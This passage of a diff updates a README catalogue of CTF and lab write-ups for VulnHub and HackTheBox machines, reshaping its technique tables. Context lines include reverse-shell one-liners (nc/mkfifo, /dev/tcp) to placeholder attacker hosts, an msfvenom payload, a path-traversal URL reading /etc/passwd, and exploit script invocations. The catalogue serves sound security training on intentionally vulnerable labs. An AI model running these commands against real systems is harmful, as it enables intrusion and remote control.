-| 1. | 11/Oct/2019 | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) |  | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) | [vulnhub#371](https://www.vulnhub.com/entry/misdirection-1,371/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) |
   
 [+] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
 [+] https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells  
@@ -940,9 +940,9 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attackerip> <attack
 #### exploit_bof [⇡](#exploit)  
 create a bof exploit to execute arbitrary code and gain interactive access on the target system  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 31/Aug/2019 | [Brainpan: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf) |  | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof), [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Brainpan: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf) | [vulnhub#51](https://www.vulnhub.com/entry/brainpan-1,51/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/killchain.png" width="100" height="100" /> | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof), [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
   
   
 ---
@@ -968,9 +968,9 @@ bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Sep/2019 | [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf) | [vulnhub#23](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend) |
   
   
 ---
@@ -1021,13 +1021,13 @@ certain webapps couldbe vulebrable to command injection via input text fields
 #### exploit_credsreuse [⇡](#exploit)  
 Reuse credentials already found for a service to interact with another service  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 13/Nov/2019 | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> |
-| 2. | 29/Oct/2019 | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> |
-| 3. | 28/Oct/2019 | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) |  | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> |
-| 4. | 10/Oct/2019 | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> |
-| 5. | 08/Oct/2019 | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) | [hackthebox#48](https://www.hackthebox.eu/home/machines/profile/48) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 2. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [vulnhub#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
+| 3. | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) | [vulnhub#252](https://www.vulnhub.com/entry/node-1,252/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 4. | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) | [vulnhub#129](https://www.vulnhub.com/entry/lord-of-the-root-101,129/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
+| 5. | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) | [vulnhub#25](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
   
   
 ---
@@ -1035,9 +1035,9 @@ Reuse credentials already found for a service to interact with another service
 #### exploit_defaultcreds [⇡](#exploit)  
 Use default credentials to interact with a service  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 12/Nov/2019 | [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf) |  | [`exploit_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_defaultcreds), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf) | [hackthebox#64](https://www.hackthebox.eu/home/machines/profile/64) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/killchain.png" width="100" height="100" /> | [`exploit_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_defaultcreds), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -1056,9 +1056,9 @@ hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
 #### exploit_ftp_anonymous [⇡](#exploit)  
 Interact with the ftp service using `anonymous/any` credentials  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 05/Nov/2019 | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) |  | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) | [hackthebox#3](https://www.hackthebox.eu/home/machines/profile/3) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) |
   
   
 ---
@@ -1066,9 +1066,9 @@ Interact with the ftp service using `anonymous/any` credentials
 #### exploit_ftp_web_root [⇡](#exploit)  
 FTP server's root directory is mapped to the web server's root directory. Upload a reverse shell file native to the web server using ftp server (`anonymous` login or default creds or creds reuse or some exploit) and trigger it's execution to gain interactive access on the target system  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 05/Nov/2019 | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) |  | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) | [hackthebox#3](https://www.hackthebox.eu/home/machines/profile/3) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) |
   
   
 ---
@@ -1110,9 +1110,9 @@ python 39161.py <targetip> <targetport>
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 04/Nov/2019 | [Optimum](https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf) |  | [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Optimum](https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf) | [hackthebox#6](https://www.hackthebox.eu/home/machines/profile/6) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/killchain.png" width="100" height="100" /> | [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) |
   
 [+] https://www.exploit-db.com/exploits/39161  
 [+] https://nvd.nist.gov/vuln/detail/CVE-2014-6287  
@@ -1127,9 +1127,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -f
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 05/Nov/2019 | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) |  | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) | [hackthebox#3](https://www.hackthebox.eu/home/machines/profile/3) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) |
   
 [+] https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells  
   
@@ -1152,10 +1152,10 @@ msfconsole
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 04/Nov/2019 | [Grandpa](https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/writeup.pdf) |  | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/killchain.png" width="100" height="100" /> |
-| 2. | 04/Nov/2019 | [Granny](https://github.com/7h3rAm/writeups/blob/master/htb.granny/writeup.pdf) |  | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.granny/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Grandpa](https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/writeup.pdf) | [hackthebox#13](https://www.hackthebox.eu/home/machines/profile/13) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/killchain.png" width="100" height="100" /> | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070) |
+| 2. | [Granny](https://github.com/7h3rAm/writeups/blob/master/htb.granny/writeup.pdf) | [hackthebox#14](https://www.hackthebox.eu/home/machines/profile/14) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.granny/killchain.png" width="100" height="100" /> | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051) |
   
 [+] https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl  
 [+] https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
@@ -1170,9 +1170,9 @@ nc -nlvp <attackerport>
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 29/Sep/2019 | [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf) |  | [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf) | [vulnhub#24](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100" /> | [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
   
 [+] https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh  
   
@@ -1188,9 +1188,9 @@ gcc -o 47080 47080.c -lcrypto
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Sep/2019 | [Kioptrix: Level 1 (#1)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf) |  | [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: Level 1 (#1)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf) | [vulnhub#22](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/killchain.png" width="100" height="100" /> | [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl) |
   
 [+] https://www.exploit-db.com/exploits/47080  
 [+] https://nvd.nist.gov/vuln/detail/CVE-2002-0082  
@@ -1206,9 +1206,9 @@ nc -nlvp <attackerport>
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Oct/2019 | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) |  | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) | [vulnhub#252](https://www.vulnhub.com/entry/node-1,252/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
   
   
 ---
@@ -1253,10 +1253,10 @@ ssh vulnix@<targetip>
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Oct/2019 | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> |
-| 2. | 20/Sep/2019 | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) | [vulnhub#244](https://www.vulnhub.com/entry/linsecurity-1,244/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) |
+| 2. | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) | [vulnhub#48](https://www.vulnhub.com/entry/hacklab-vulnix,48/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) |
   
 [+] https://blog.christophetd.fr/write-up-vulnix/  
   
@@ -1265,9 +1265,9 @@ ssh vulnix@<targetip>
 #### exploit_nodejs [⇡](#exploit)  
 inspect source for `assets/js/app/controllers/*.js` files and look for rest api calls that could leak sensitive information  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Oct/2019 | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) |  | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) | [vulnhub#252](https://www.vulnhub.com/entry/node-1,252/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
   
   
 ---
@@ -1289,9 +1289,9 @@ http://<targetip>/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/p
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
